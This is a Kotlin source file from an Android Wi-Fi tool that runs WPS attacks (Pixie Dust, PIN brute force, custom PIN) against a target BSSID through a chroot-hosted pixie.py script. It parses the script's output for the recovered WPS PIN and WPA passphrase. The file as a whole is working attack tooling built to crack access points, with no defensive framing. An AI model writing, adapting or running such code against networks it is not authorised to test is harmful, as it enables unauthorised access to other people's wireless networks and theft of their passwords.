package com.lsd.wififrankenstein.util

import android.content.Context
import com.lsd.wififrankenstein.R
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.TimeoutCancellationException
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeout
import java.util.regex.Pattern

enum class WpsAttackMode {
    PIXIE_DUST,
    WPS_BRUTE,
    CUSTOM_PIN
}

data class WpsBruteForceProgress(
    val line: String,
    val percentComplete: Float?,
    val currentPin: String?,
    val speed: String?
)

data class WpsBruteForceResult(
    val wpsPin: String?,
    val wpaPsk: String?,
    val success: Boolean,
    val rawOutput: String
)

class WpsBruteForceRunner(private val context: Context) {

    private val chrootManager = ChrootManager(context)

    companion object {
        private const val TAG = "WpsBruteForceRunner"
        private const val PIXIE_SCRIPT = "/opt/PixieWps/pixie.py"
        private val PIN_REGEX =
            Regex("(\\[\\+\\]\\s*WPS\\s*PIN:\\s*|\\[\\+\\]\\s*WPS\\s*pin:\\s*)'?([\\d]{4,8})'?")
        private val PSK_REGEX =
            Regex("(\\[\\+\\]\\s*WPA\\s*PSK:\\s*|\\[\\+\\]\\s*WPA\\s*psk:\\s*)'?([^\\s']+)'?")
        private val BSSID_REGEX = Regex("^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")
        private val PERCENT_REGEX = Pattern.compile("(\\d+\\.\\d+)%\\s*complete")
        private val PIN_TRYING_REGEX = Pattern.compile("Trying\\s+PIN\\s+(\\d+)")
        private val SPEED_REGEX = Pattern.compile("(\\d+\\.\\d+)\\s*seconds")
    }

    private suspend fun executeAttack(
        bssid: String,
        interfaceName: String,
        mode: WpsAttackMode,
        customPin: String? = null,
        disableWifiBeforeAttack: Boolean = true,
        onProgress: ((WpsBruteForceProgress) -> Unit)? = null
    ): WpsBruteForceResult {
        return withContext(Dispatchers.IO) {
            Log.d(TAG, "=== ${mode.name} START ===")
            Log.d(
                TAG,
                "Parameters: bssid=$bssid, interface=$interfaceName, mode=$mode, customPin=$customPin"
            )

            try {
                withTimeout(if (mode == WpsAttackMode.PIXIE_DUST) 60_000L else 300_000L) {
                    if (disableWifiBeforeAttack && chrootManager.disableWifiOnHost()) {
                        Log.d(TAG, "WiFi disabled via svc on host")
                        delay(2000)
                    }

                    val cmd = buildCommand(bssid, interfaceName, mode, customPin)
                    Log.d(TAG, "Built command: $cmd")

                    val binaryCheck = chrootManager.checkChrootBinaries()
                    Log.d(TAG, "Binary check result: $binaryCheck")

                    onProgress?.invoke(
                        WpsBruteForceProgress(
                            context.getString(R.string.brute_starting, mode.name),
                            null,
                            null,
                            null
                        )
                    )

                    val result = chrootManager.executePersistentSession(
                        cmd,
                        onOutput = { line ->
                            Log.d(TAG, "Chroot output: $line")

                            val percent = parsePercent(line)
                            val pin = parsePinTrying(line)
                            val speed = parseSpeed(line)

                            onProgress?.invoke(WpsBruteForceProgress(line, percent, pin, speed))
                        },
                        sessionTimeout = if (mode == WpsAttackMode.PIXIE_DUST) 120_000L else 360_000L
                    )

                    val combinedOutput =
                        result.stdout.joinToString("\n") + "\n" + result.stderr.joinToString("\n")
                    val parsed = parseResult(combinedOutput, mode)

                    Log.d(TAG, "=== ${mode.name} COMPLETE ===")
                    Log.d(
                        TAG,
                        "Result: pin=${parsed.wpsPin}, psk=${parsed.wpaPsk}, success=${parsed.success}"
                    )
                    parsed
                }
            } catch (e: TimeoutCancellationException) {
                Log.w(TAG, "${mode.name} timed out")
                cancel()
                WpsBruteForceResult(null, null, false, "TIMEOUT")
            } catch (e: Exception) {
                Log.e(TAG, "${mode.name} threw exception", e)
                WpsBruteForceResult(null, null, false, "ERROR: ${e.message}")
            } finally {
                try {
                    chrootManager.enableWifiOnHost()
                    delay(2000)
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to re-enable WiFi", e)
                }
            }
        }
    }

    private fun buildCommand(
        bssid: String,
        iface: String,
        mode: WpsAttackMode,
        customPin: String?
    ): String {
        if (bssid.isNotEmpty() && !BSSID_REGEX.matches(bssid)) {
            throw IllegalArgumentException("Invalid BSSID format: $bssid")
        }

        val pixieCmd = when (mode) {
            WpsAttackMode.PIXIE_DUST -> "python3 -u $PIXIE_SCRIPT -i $iface --iface-down -v -K -F -b $bssid"
            WpsAttackMode.WPS_BRUTE -> "python3 -u $PIXIE_SCRIPT -i $iface --iface-down -B -b $bssid"
            WpsAttackMode.CUSTOM_PIN -> {
                val pin = customPin
                    ?: throw IllegalArgumentException("Custom PIN required for CUSTOM_PIN mode")
                "python3 -u $PIXIE_SCRIPT -i $iface --iface-down -p $pin -b $bssid"
            }
        }

        val doneMarker = when (mode) {
            WpsAttackMode.PIXIE_DUST -> "PIXIE_DONE"
            WpsAttackMode.WPS_BRUTE -> "BRUTE_DONE"
            WpsAttackMode.CUSTOM_PIN -> "PIN_DONE"
        }

        return "$pixieCmd ; echo $doneMarker"
    }

    suspend fun runPixieDust(
        bssid: String,
        interfaceName: String = "wlan0",
        disableWifiBeforeAttack: Boolean = true,
        onProgress: ((WpsBruteForceProgress) -> Unit)? = null
    ): WpsBruteForceResult {
        return executeAttack(
            bssid,
            interfaceName,
            WpsAttackMode.PIXIE_DUST,
            null,
            disableWifiBeforeAttack,
            onProgress
        )
    }

    suspend fun runBruteForce(
        bssid: String,
        interfaceName: String = "wlan0",
        disableWifiBeforeAttack: Boolean = true,
        onProgress: ((WpsBruteForceProgress) -> Unit)? = null
    ): WpsBruteForceResult {
        return executeAttack(
            bssid,
            interfaceName,
            WpsAttackMode.WPS_BRUTE,
            null,
            disableWifiBeforeAttack,
            onProgress
        )
    }

    suspend fun runCustomPin(
        bssid: String,
        pin: String,
        interfaceName: String = "wlan0",
        disableWifiBeforeAttack: Boolean = true,
        onProgress: ((WpsBruteForceProgress) -> Unit)? = null
    ): WpsBruteForceResult {
        return executeAttack(
            bssid,
            interfaceName,
            WpsAttackMode.CUSTOM_PIN,
            pin,
            disableWifiBeforeAttack,
            onProgress
        )
    }

    suspend fun cancel() {
        Log.d(TAG, "Attack cancellation requested")
        chrootManager.cancelSession()
        chrootManager.forceCleanup()
    }

    private fun parsePercent(line: String): Float? {
        val matcher = PERCENT_REGEX.matcher(line)
        return if (matcher.find()) {
            matcher.group(1)?.toFloatOrNull()
        } else null
    }

    private fun parsePinTrying(line: String): String? {
        val matcher = PIN_TRYING_REGEX.matcher(line)
        return if (matcher.find()) matcher.group(1) else null
    }

    private fun parseSpeed(line: String): String? {
        val matcher = SPEED_REGEX.matcher(line)
        return if (matcher.find()) "${matcher.group(1)} sec" else null
    }

    private fun parseResult(output: String, mode: WpsAttackMode): WpsBruteForceResult {
        var pin: String? = null
        var psk: String? = null
        var success = false

        val lines = output.split("\n")
        for (line in lines) {
            val trimmed = line.trim()
            if (trimmed.isEmpty()) continue

            val pinMatch = PIN_REGEX.find(trimmed)
            if (pinMatch != null) {
                pin = pinMatch.groups[2]?.value
            }

            val pskMatch = PSK_REGEX.find(trimmed)
            if (pskMatch != null) {
                psk = pskMatch.groups[2]?.value?.trim('"')
            }
        }

        val lastLines = output.lines().takeLast(10)
        val hasTimeout = lastLines.any { it.contains("timeout", ignoreCase = true) }
        val hasTerminated = lastLines.any { it.contains("Terminated", ignoreCase = true) }

        success = when {
            pin != null && psk != null -> true
            hasTimeout || hasTerminated -> false
            pin != null -> true
            else -> false
        }

        return WpsBruteForceResult(pin, psk, success, output)
    }
}
